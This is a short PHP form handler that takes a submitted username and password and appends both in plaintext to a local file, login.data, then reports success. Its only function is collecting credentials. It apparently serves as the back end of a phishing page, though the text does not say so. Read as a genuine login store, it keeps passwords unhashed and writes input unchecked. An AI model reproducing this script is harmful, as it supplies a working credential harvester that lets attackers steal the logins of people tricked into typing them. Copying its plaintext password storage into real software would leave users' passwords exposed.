<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve username and password from POST data
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Prepare the data to save in the file
    $data = "$username\n$password\n";

    // Open the file in append mode
    $file = fopen("login.data", "a");

    if ($file) {
        // Write the data to the file
        fwrite($file, $data);
        fclose($file);
        echo "Data has been saved successfully!";
    } else {
        echo "Error opening the file!";
    }
} else {
    echo "Invalid request.";
}
?>

